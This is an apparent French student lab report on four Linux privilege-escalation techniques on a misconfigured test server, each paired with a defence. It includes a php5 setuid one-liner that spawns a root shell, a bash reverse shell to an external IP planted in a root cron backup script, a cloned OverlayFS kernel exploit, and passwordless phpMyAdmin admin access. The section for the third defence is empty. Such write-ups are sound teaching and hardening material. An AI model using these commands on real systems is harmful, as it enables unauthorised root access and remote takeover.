# Rapport Be Root

### Prérequis pour ce rapport


Premièrement dans les exemples ci-dessous l'utilisation du compte utilisateur linux **www-data** sera faite. Cette utilisateur a donc des droits restreints sur la majorité du serveur hormis la partie Web.
```bash
sudo -i <-- Permet de passer root
sudo -u www-data bash <-- Permet de se connecter sur cet utilisateur
```

### Attaque 1 : Erreur de capabilities

#### **Introduction :**
Les capabilities sous Linux sont un mécanisme de contrôle d'accès qui permet de limiter les privilèges d'un processus. Au lieu de donner à un processus un ensemble complet de privilèges, les capabilities permettent de décomposer les privilèges en différentes capacités indépendantes.

Chaque capacité représente un privilège spécifique, comme la capacité de lire ou d'écrire dans un fichier protégé, de changer l'ID utilisateur d'un processus, etc. Les programmes peuvent être conçus pour n'avoir accès qu'à un sous-ensemble restreint de capacités, ce qui les empêche d'exécuter des actions malveillantes ou dangereuses.

Les capabilities peuvent être définies au niveau du système ou au niveau du processus en utilisant des outils tels que setcap ou pcapset. Les capabilities peuvent également être définies en utilisant les options de lancement de programmes pour spécifier les capacités nécessaires à un processus pour fonctionner.

En utilisant les capabilities, les administrateurs système peuvent mieux contrôler les privilèges des processus sur le système, ce qui peut aider à réduire les risques de sécurité en limitant les actions que les processus peuvent effectuer.

Voici une liste de capabilites non-exhaustive : 

| Nom          | Utilisation                                       |
|--------------|---------------------------------------------------|
| CAP_SETGID   | Permet le changement du GID                       |
| CAP_SETUID   | Permet le changement du UID                       |
| CAP_SETPCAP  | Permet le transfert de capabilites à d’autres PID |
| CAP_IPC_LOCK | Permet de verrouiller la mémoire                  |
| ...          | ...                                               |

#### **Prérequis pour l'attaque :**
Pour pouvoir exploiter une vulnérabilité basée sur les capabilites de Linux il va nous falloir vérifier si des exécutables binaires ont été modifiés afin de savoir s'ils sont vulnérables à l'exécution d'un code arbitraire.

Il faut donc que l'administrateur du serveur ait fait une erreur de configuration sur un des binaires pour pouvoir nous en servir.

#### **Exploitation de la vulnérabilité :** 

Au préalable de l'exploitation nous allons faire de la reconnaisance. C'est-à-dire chercher des binaires qui ont été modifiés sur le serveur.

Des utilitaires comme [*linpeas*](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) peuvent permettre de faire une reconnaisance globale d'un serveur en recherchant des erreurs de configuration sur des services, problème de droits etc...

Dans notre cas l'utilisation d'une commande sera suffisante : 

```bash
getcap -r / 2>/dev/null
```

Cette commande retourne en résultat les fichiers binaires qui ont été modifiés par un utilisateur à haut privilège.

La commande retourne cette ligne : 
> /usr/bin/php5 = cap_setuid+ep
> 

Comme vu auparavant ***cap_setuid*** nous permet de dire que la manipulation des UID est possible avec le binaire ***php5***.

Maintenant que nous avons cette information, l'exploitation de la vulnérabilité est possible en lancant la commande suivante : 

```bash
CMD="/bin/bash" && /usr/bin/php5 -r "posix_setuid(0); system('$CMD');"
```
Cette commande utilise l'interpréteur de commandes PHP pour exécuter une commande shell. Elle accomplit les actions suivantes :

- /usr/bin/php5 : Ce chemin d'accès indique à l'interpréteur de commandes du système d'exécuter l'interpréteur PHP5.

- -r : Ce drapeau indique à PHP d'exécuter le code suivant en mode ligne de commande, sans lire de fichier PHP.

- posix_setuid(0) : Cette fonction PHP appelle la fonction setuid de la bibliothèque POSIX pour définir l'identificateur d'utilisateur (UID) sur 0, ce qui signifie que le processus exécutant ce code aura les privilèges du superutilisateur (root).

- system('$CMD') : Cette instruction PHP appelle la fonction system pour exécuter une commande shell en utilisant la variable $CMD. La variable $CMD contient la commande shell à exécuter.

A partir de là, intépreteur de commande est donc lancé en tant **qu'administrateur du serveur**.


### Défense 1 : Erreur de capabilities

#### **Mise en place de la défense :**

La manière la plus simple est d'enlever le droit d'exécution de changement des UID sur le binaire en question PHP5 : 

```bash
setcap -r /usr/bin/php5
```
L'exploitation de cette vulnérabilité ne sera plus envisageable.

Pour anticiper ce type de modification il y a des outils comme AIDE qui s'agit d'une solution de détection des intrusions basée sur les modifications apportées au système surveillé.

Ce type de solution est également appelée solution de contrôle d'intégrité ou de scellement, elle vise à s'assurer qu'un ensemble d'éléments de notre système n'ont pas été modifiée.

On peut donc faire en sorte de le configurer pour vérifier lorsqu'il a des manipulations sur le serveur.

### Attaque 2 : Erreur de droit via sudo ou setuid

#### **Introduction :**

Dans cette partie, l'attaque consiste d'abord à vérifier que les droits des différents répertoires du serveur ont été correctement configurés. Afin de vérifier ça nous allons faire aussi de la reconnaissance / scan sur la machine pour vérifier cela : 

#### **Reconnaisance sur le serveur :**

```bash
find / -writable  2>/dev/null | egrep '\.(sh|bash|py|rb|php)$'
```

Cette commande va nous permettre de savoir si des fichiers sont éditables sur le serveur ayant comme extension de fichier soit *.sh*, *.bash*, *.py*, *.rb* et *.php*.

La commande nous retourne : 
> /var/www/html/backup.sh

Grâce à cette commande nous avons comme information que le fichier *backup.sh* est éditable en écriture et donc en lecture.

Maintenant nous allons voir ce que retourne ce fichier et son contenu : 

```bash
#!/bin/bash
################################

# What to backup
backup_files="/home /var/spool/mail /etc /root /boot /opt /etc/phpmyadmin"

# Where to backup to
dest="/mnt/backup"

# Create archive filename
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Backup the files using tar
tar czf $dest/$archive_file $backup_files
```

Pour résumé, ce script permet une sauvegarde des fichiers de configurations de différents répertoires */home*, */root*, */etc* */phpmyadmin*... Et compresse tout ça via la commande **tar** pour réduire la taille de l'archive. Et pour finir cette archive est déposée dans le /mnt/backup. 

Après avoir echangé à l'oral avec l'entreprise cliente, ce répertoire est leur disque dur externe permettant de faire des sauvegardes.

Puis nous allons simplement vérifier les droits sur ce fichier pour s'assurer desdits droits.

```bash
ls -l /var/www/html/backup.sh
```
> -rwxrwxrw- 1 adminberoot vagrant   351 Feb  4 15:17 backup.sh

Cependant, même si le fichier est éditable, aucun moyen de l'exécuter via l'utilisateur sur lequel nous sommes (**www-data**).

En continuant la reconnaissance le serveur et avec un peu de bon sens, nous nous demandons si les backups ne sont pas faites via l'exécution d'une tâche automatique, l'utilisation la plus connue pour faire ça et la commande ***"cron"***.

Pour véfifier ça nous faisons la commande : 

```bash
cat /etc/cron*
```

Qui retourne : 

```bash=
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/6 * * * * adminberoot sudo /var/www/html/backup.sh
```
#### **Exploitation de la vulnérabilité :**

En effet cela confirme que ce script s'exécute via une tâche cron avec pour droit et l'exécution, l'utilisateur ***adminberoot***.

Cela donne aussi comme information que le script se lance toutes les 6 heures.

Ayant comme information que la commande s'exécute via l'utilisation de ***"sudo"*** on sait que cette utilisateur posséde les droits administrateurs sur le serveur.

Il nous suffit maintenant d'éditer ce script et de rajouter à la fin, à l'exécution un reverse shell : 

```bash
...
# Backup the files using tar
tar czf $dest/$archive_file $backup_files
#payload
bash -i >& /dev/tcp/34.155.229.106/8080 0>&1
```

Dorénavant il faut mettre en écoute notre serveur dit "attaquant" sur le port 8080. 

Pour l'exploitation de cette vulnérabilité j'ai utilisé un serveur distant, ouvert sur Internet.

Pour se mettre en écoute sur la machine attaquante :

> PS : Il faudrat être patient le temps que le script s'exécute automatiquement.

```bash
nc -lvp 8080
```

Nous voilà ***root*** sur le serveur !

![](https://i.imgur.com/LTLfubc.png)

### Défense 2 : Erreur de droit via sudo ou setuid

#### **Mise en place de la défense :**

Afin de se protéger de ce type de vulnérabilité il faut attribuer les bons droits pour chaque création de dossiers ou fichiers faites sur le serveur.

Pour vérifier ça efficacement on peut utiliser cette commande : 

```bash
find / -writable  2>/dev/null
```
En exécutant cette commande on peut s'apercevoir des droits en écritures sur les fichiers du serveur avec l'utilisateur avec lequel nous l'avons exécutée.

> PS : ***find / -writable -d 2>/dev/null*** permet voir pour les dossiers en écriture

Il est aussi possible maintenant de rajouter une tâche cron uniquement pour le profil d'un utilisateur, ce qui permet qu'un attaquant voit plus difficilement toutes les tâches cron lancées en fond sur le serveur.

Pour faire ça : 

```bash
crontab -e
```

> PS : Cron de l'utilisateur contenu dans /var/spool/cron/crontabs

En conclusion, ce qui paraît être le meilleur moyen de se protéger de ce type d'attaque est l'utilisation d'un compte à droits très limités qui pourrait se nommé ***"backup_user"*** permettant uniquement d'exécuter sa tâche de sauvegarde.

### Attaque 3 : Erreur de mise à jours
#### **Introduction :**
La CVE-2021-3493 est une vulnérabilité affectant le module du kernel **OverlayFS** permettant une élévation de privilèges.
OverlayFS est un système de fichiers qui permet de combiner plusieurs systèmes de fichiers (ou point de montage) en un seul.

Ici, nous allons l'effectuer sur le kernel de version ```3.16.0-30```.

La vulnérabilité est liée à un problème de traitement de la mémoire, qui permet par exemple à un attaquant d'exécuter du code ou des commandes via un utilisateur non root.

#### **Exploitation de la vulnérabilité :**

Pour ce faire, nous aurons besoin de 2 paquets sur le système : ```git``` et ```gcc``` (gcc étant souvent installé par défaut).

Nous utilisons [**ce script**](https://github.com/loicoddon/TP_be_root/blob/main/scripts/exploit.c) qui nous permet de l'exploiter.
Celui ci se trouve dans ce repository, on le récupère : 

```bash
git clone https://github.com/loicoddon/TP_be_root
```

Puis on le compile :

```bash
cd scripts/
gcc exploit.c -o exploit
```
Avant d'exécuter on vérifie avec quel utilisateur nous sommes loggé :

```bash
whoami && id
```

Enfin on l'exécute : 

```bash
./exploit
```

Puis on vérifie de nouveau :

```bash
whoami && id
```

Cette fois nous voyons que nous ne sommes plus un utilisateur classique, mais bien root de la machine.

### Défense 3 : Erreur de mise à jours

### Attaque 4 : Erreur de fichier commenté
#### **Introduction :**

Pour commencer nous allons une nouvelle fois en amont faire de la reconnaissance afin d'avoir un maximum d'information à l'aide de l'utilisateur déjà connecté. (www-data)

Après plusieurs recherches on trouve un service nommé "phpmyadmin"

![](https://i.imgur.com/mTJJJd3.png)


#### **Exploitation de la vulnérabilité :**
Nous avons donc enquêtez sur des erreurs de configurations potentielles, les fichiers de configurations de phpmyadmin se trouvant dans le chemin */etc/phpmyadmin/*

Les fichiers intéressants sont : 
- apache.conf
- config.inc.php
- htpasswd.setup

Après la lecture du code, on s'aperçoit d'une erreur de configuration dans le fichier *config.inc.php* qui nous donne l'information d'un utilisateur base de données se nommant beroot_admin...

```php
 if (!empty($dbport) || $dbserver != 'localhost') {
        $cfg['Servers'][$i]['connect_type'] = 'tcp';
        $cfg['Servers'][$i]['port'] = $dbport;
    }
    //$cfg['Servers'][$i]['compress'] = false;
    /* Select mysqli if your server has it */
    $cfg['Servers'][$i]['extension'] = 'mysqli';
    /* Optional: User for advanced features */
    $cfg['Servers'][$i]['controluser'] = beroot_admin; <-- ICI
    $cfg['Servers'][$i]['controlpass'] = $dbpass;
    /* Optional: Advanced phpMyAdmin features */
```
De plus, un peu plus loin dans le fichier on peut voir une ligne décommentée très intéressante :

```php
  /* Uncomment the following to enable logging in to passwordless accounts,
     * after taking note of the associated security risks. */
    $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
//CONFIGURATION DU SERVEUR EN COURS ENLEVER COMMENTER LA LIGNE CI-DESSUS DES QUE POSSIBLE !!!
```
Grâce à cette information on peut en déduire que : 
- Un utilisateur se nommant **"beroot_admin"** existe
- Il n'a à première vue aucun mot de passe

Il serait donc possible de se connecter à Phpmyadmin sans mot de passe avec cet utilisateur : 

En allant sur le navigateur avec cette URL : 

```text
http://192.168.1.200/phpmyadmin
```
![](https://i.imgur.com/AhcPrmo.png)

![](https://i.imgur.com/ovtAslb.png)

En allant plus loin on peut voir les droits attribués à cet utilisateur : 

![](https://i.imgur.com/q1thkIw.png)

L'utilisateur beroot_admin est donc administrateur de toutes les bases de données du service MySQL. Un attaquant malveillant peut donc altérer des bases de données en interne afin de possiblement étendre son attaque sur tout le réseau de la société

### Défense 4 : Erreur de fichier commenté

Afin de se protéger de ce type d'erreur humaine il faut absolument faire des rappels à l'aide d'un calendrier pour que l'administrateur de la société supprime cette configuration qui doit être **temporaire**.

On peut aussi fixer une data d'expiration sur l'utilisateur en question pour éviter de le laisser indéfiniement sur le serveur.
